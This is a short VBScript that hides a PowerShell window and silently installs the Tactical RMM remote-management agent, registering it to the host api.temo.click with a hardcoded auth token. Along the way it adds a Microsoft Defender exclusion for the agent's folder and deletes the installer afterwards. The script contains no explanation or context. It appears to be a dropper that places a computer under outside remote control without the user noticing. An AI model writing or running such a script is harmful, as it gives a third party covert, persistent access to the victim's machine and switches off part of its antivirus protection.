Set objShell = CreateObject("WScript.Shell")

Dim api, auth, clientid, siteid, downloadlink
api = "https://api.temo.click"
auth = "644d7a12f354c9d0b02852323c0e790092dd2021b4dbcf1f1a7cf86327eb924d"
clientid = "1"
siteid = "1"
downloadlink = "https://github.com/amidaware/rmmagent/releases/download/v2.10.0/tacticalagent-v2.10.0-windows-amd64.exe"

psCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""& {" & _
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
"$OutPath = Join-Path $env:TMP 'agent_setup.exe'; " & _
"if (-not (Get-Service tacticalrmm -ErrorAction SilentlyContinue)) { " & _
"Add-MpPreference -ExclusionPath 'C:\Program Files\TacticalAgent\*' -ErrorAction SilentlyContinue; " & _
"Invoke-WebRequest -Uri '" & downloadlink & "' -OutFile $OutPath; " & _
"Start-Process -FilePath $OutPath -ArgumentList '/VERYSILENT /SUPPRESSMSGBOXES' -Wait; " & _
"Start-Process -FilePath 'C:\Program Files\TacticalAgent\tacticalrmm.exe' -ArgumentList '-m install --api " & api & " --client-id " & clientid & " --site-id " & siteid & " --agent-type server --auth " & auth & "' -WindowStyle Hidden -Wait; " & _
"Remove-Item $OutPath -ErrorAction SilentlyContinue; " & _
"} }"""

objShell.Run psCommand, 0, True
